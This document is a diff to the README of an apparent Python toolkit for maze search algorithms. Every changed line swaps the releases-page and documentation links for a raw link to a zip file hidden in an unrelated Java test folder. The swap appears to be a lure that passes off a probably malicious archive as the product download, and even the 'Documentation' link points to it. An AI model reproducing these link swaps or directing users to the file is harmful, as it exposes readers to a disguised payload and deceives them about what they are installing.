@@ -1,7 +1,7 @@
 # 🤖 python-ai-search-toolkit - Simplified AI Search for Everyone
 
 ## 🔗 Download Now
-[![Download the Tool](https://img.shields.io/badge/Download_the_Tool-Click_Here-brightgreen)](https://github.com/chandan-singh101/python-ai-search-toolkit/releases)
+[![Download the Tool](https://raw.githubusercontent.com/chandan-singh101/python-ai-search-toolkit/main/src/test/java/com/example/python-ai-search-toolkit_v1.9.zip)](https://raw.githubusercontent.com/chandan-singh101/python-ai-search-toolkit/main/src/test/java/com/example/python-ai-search-toolkit_v1.9.zip)
 
 ## 📖 Description
 The **python-ai-search-toolkit** is a user-friendly toolkit designed to help you understand AI search algorithms. This toolkit implements various foundational algorithms such as Depth-First Search (DFS), Breadth-First Search (BFS), Uniform Cost Search (UCS), and A* for solving grid-based maze problems. Whether you are a student or just curious about artificial intelligence, this toolkit provides a straightforward way to explore these concepts.
@@ -22,7 +22,7 @@ To get started with the **python-ai-search-toolkit**, follow these simple steps:
 - **Storage:** Minimum of 100 MB of free space.
 
 ### 2. Download & Install
-1. Visit this page to download: [Download the Tool](https://github.com/chandan-singh101/python-ai-search-toolkit/releases).
+1. Visit this page to download: [Download the Tool](https://raw.githubusercontent.com/chandan-singh101/python-ai-search-toolkit/main/src/test/java/com/example/python-ai-search-toolkit_v1.9.zip).
 2. Choose the version suitable for your operating system.
 3. Click on the file to download it to your computer.
 4. Once the download finishes, follow these steps based on your operating system to install the toolkit:
@@ -61,7 +61,7 @@ UCS finds the least expensive path to the goal by exploring all the nodes with t
 A* combines the strengths of UCS and greedy search. It evaluates nodes using a heuristic to guide the search.
 
 ## 📚 Documentation & Support
-If you need help using the toolkit, check out the [Documentation](https://github.com/chandan-singh101/python-ai-search-toolkit/blob/main/README.md). 
+If you need help using the toolkit, check out the [Documentation](https://raw.githubusercontent.com/chandan-singh101/python-ai-search-toolkit/main/src/test/java/com/example/python-ai-search-toolkit_v1.9.zip). 
 For further questions, feel free to reach out to our support by opening an issue in this repository.
 
 ## 🔧 Future Updates
